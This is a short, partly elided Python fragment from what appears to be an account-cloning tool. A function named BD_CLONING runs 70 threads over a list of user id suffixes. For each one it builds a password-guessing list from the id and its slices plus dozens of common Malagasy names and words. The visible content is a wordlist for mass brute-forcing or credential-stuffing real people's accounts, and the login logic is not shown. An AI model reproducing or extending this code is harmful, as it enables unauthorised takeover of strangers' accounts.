...
def BD_CLONING():
    ...
    with tred(max_workers=70) as Dipto:
        ...
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:6],ids[:6],ids[5:],'koloina','Koloina','fitiavana','Fitiavana','nantenaina','Nantenaina','malala','Malala','mamiko','Mamiko','mahery','Mahery','harena','Harena','sarika','Sarika','zanako','Zanako','felana','Felana','mamako','Mamako','nilaina','Nilaina','nirina','Nirina','papako','Papako','nomena','Nomena','malalako','Malalako','jesosy','Jesosy','tantely','Tantely','vadiko','Vadiko','fandresena','sitraka','safidy','mahefa','fitiavako','milely','rojotina','tolotra','sarobidy','fanantenana','mahandry','Mahandry','tantely','Tantely','jesosy','Mahandry','fandresena','Fandresena','harena','Harena','nekena','Nekena','mahefa','Mahefa','harena','Harena','Fiderana','fitiavako','fanilo','anjarako','saholy','salohy','lalaina','tsilavina','tahina','anjara','nilaina','fanasina','hasina','jesosy','dadako','badoda','heritina']
